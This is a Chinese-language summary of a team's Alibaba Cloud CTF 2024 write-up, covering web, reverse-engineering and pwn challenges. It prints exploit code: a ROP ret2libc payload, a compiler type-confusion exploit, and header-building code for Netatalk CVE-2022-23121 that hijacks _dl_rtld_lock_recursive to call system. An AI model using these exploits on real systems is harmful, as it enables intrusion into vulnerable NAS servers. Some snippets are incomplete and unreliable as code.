---
title: 阿里云CTF 2024 writeup
contest: 阿里云CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [Web-Pastbin,并发-Go-routine,Go-Router,MIME+skip中间件,Re-欧拉图dfs+约束,easyCAS,ASLR-CAS,Pwn-0x2d44溢出+ret2libc,klang编译器漏洞,Netatalk-CVE-2022-23121,AppleDouble-header,FPOpenFork,_dl_rtld_lock_recursive]
attack_chain: web签到: 抓包+decode+转base64+加hash(.)submit token|easyCAS: Go协程+64+32 limiter+多线程爆破|Pastbin: handle(mws=append(c.mws, getMWFromHandler(h)))+route越权|Re-欧拉: 邻接矩阵dfs+17节点+约束flag[14]=7+flag[17]=4|Pwn sign_in: 0x2d44 read(0x500)溢出c0(0x300)覆盖ptr,write_got leak libc,ROP __free_hook+open flag|klang: get_int+arb_read+arb_write+array_new fuzz类型混淆,写shellcode到栈+劫持puts_got|Netatalk: FPOpenFork(flag=2)打开test_file,AppleDouble header ADEID_FINDERI偏移0x32+memcpy+memmove改_dl_rtld_lock_recursive=system+_dl_load_lock=cmd
key_payload: data=W3sibmFtZSI6Im5hbWUiLCJ2YWx1ZSI6Im9uIn0seyJuYW1lIjoiZmxhZyIsInZhbHVlIjoib24ifV0=|/flag flag{70c6a4340c6c5bb3b0b34a8caa9a872f}|payload = b'a'*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)|get_int/arb_read/arb_write/array_new fuzz|createAppleDouble_leak: pack(0x7fa,32,'big',True) + p32(0x100)|createAppleDouble_write: pack(0x4504,32,'big',True) + 'cat /flag.txt > /home/xxxx/shared/flag\x00'.ljust(0x32c) + p32(system)
one_liner: 阿里云CTF 2024 El3ctronic战队第四名全方向:web签到Pastbin+easyCAS+Re欧拉+sign_in溢出ret2libc+klang编译器fuzz类型混淆写shellcode+Netatalk CVE-2022-23121 AppleDouble改_dl_rtld_lock_recursive=system
lesson: 1) easyCAS Go并发限流:limiter1+limiter2+go func+select{};2) Pastbin Router handle append mws中间件链;3) 欧拉图dfs:邻接矩阵e[u][v]!use[u][v]+约束;4) 0x2d44 read(0x500)溢出c0(0x300)覆盖ptr:write_got leak→ROP;5) klang编译器fuzz类型混淆:int/string/array混用→写shellcode到栈+puts_got hijack;6) Netatalk CVE-2022-23121:FPOpenFork flag=2+AppleDouble ADEID_FINDERI偏移0x32+memmove改_dl_rtld_lock_recursive
quality: high
---

## 备注

原文(https://www.ctfiot.com/170638.html)阿里云CTF 2024,El3ctronic战队(杭电Vidar+西电L+电子科大CNSS+凌武实验室)第4名。多方向高难度合集。

### 题目详情

**Web-签到 / Pastbin / easyCAS**

- web签到:Go协程limiter1(64)+limiter2(32)+go func+select{}
- Pastbin:`func (rtr *Router) Handle` 中 `c.mws = append(c.mws, getMWFromHandler(h))` 链
- easyCAS:Go并发限流

**Re-欧拉**
```c
int mmm[9*9]={...};// 邻接矩阵
int flag[20];
void dfs(int u, int len) {
    flag[len] = u;
    if (len == 17) {
        if (flag[1]>flag[2] && flag[3]<flag[4] && flag[0]==flag[8] && flag[11]==flag[15] && flag[10]>flag[5] && flag[3]<flag[13] && flag[7]<flag[4] && flag[14]==7 && flag[17]==4) {
            for (int i=0;i<18;i++) printf("%d", flag[i]);
        }
        return;
    }
    for (int v=0; v<9; v++)
        if (e[u][v] && !use[u][v]) {
            use[u][v] = use[v][u] = 1;
            dfs(v, len+1);
            use[u][v] = use[v][u] = 0;
        }
}
```

**Pwn-sign_in**
- 0x2d44 read(0x500)溢出c0(0x300)覆盖ptr
- write_plt=0x400450 + write_got=0x601018
- pop_rdi=0x400643 + pop_rsi=0x400641
- payload = `b'a'*0x88 + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(write_got)*2 + p64(write_plt) + p64(0x4005BD)`
- libc_base = leak - write_off
- flag{70c6a4340c6c5bb3b0b34a8caa9a872f}

**Pwn-klang(自研编译器)**
```c
function get_int(int i) : -> int { return i; }
function arb_read() : string s1 -> void { prints(s1); s1 := "A"; prints(s1); return; }
function write_gadget(int data) : array a1 -> void { a1[0] := data; a1 := array_new(1); return; }
function arb_write(int fa, int data) : int a1 -> void { a1 := fa; write_gadget(data); printi(a1); return; }
function main() : int t, int i -> int {
    do_leak();
    do_leak();
    i := 12;
    do {
        do_write();
        i := i - 1;
    } while (i >= 0);
    do_write();
    prints("trigger");
    return 0;
}
```
- 类型混淆:Allocatables[] = {RCX, R8, R9, R10, R11, RSI, RDI} 加wrapper控制RCE
- 写shellcode到栈+劫持puts_got

**Pwn-Netatalk CVE-2022-23121**
```python
def createAppleDouble_leak():
    header = p32(0x51607)        # Magic
    header += p32(0x20000)        # Version
    header += p8(0) * 16         # Filler
    header += p16(2)              # Number of entries
    header += p32(9)              # Entry Id Finder Info
    header += pack(0x7fa, 32, 'big', True)  # offset
    header += p32(30)             # length != 32 → ad_convert_osx
    header += p32(2)              # Type Resource fork
    header += p32(0x100)          # mmap size
    header += p32(0)              # length
    header += b'abcdefghijklmnopqrstuvwzxy1234567890'
    return header

def createAppleDouble_write(system):
    header += pack(0x4504, 32, 'big', True)
    header += p32(0x32)          # mmap size control
    header += p32(0x32c + 8)
    header += b'cat /flag.txt > /home/xxxx/shared/flag\x00'.ljust(0x32c) + p32(system, endian='little')
    return header
```

## 评级

- **quality: high** — 全方向5题,Web+Re+Pwn+Netatalk高难度,El3ctronic战队第4名
- **vuln_type: web_unknown** — 主分类Web
- 实战价值:Netatalk CVE-2022-23121是真实IoT NAS高危漏洞,klang自研编译器fuzz是学术级别
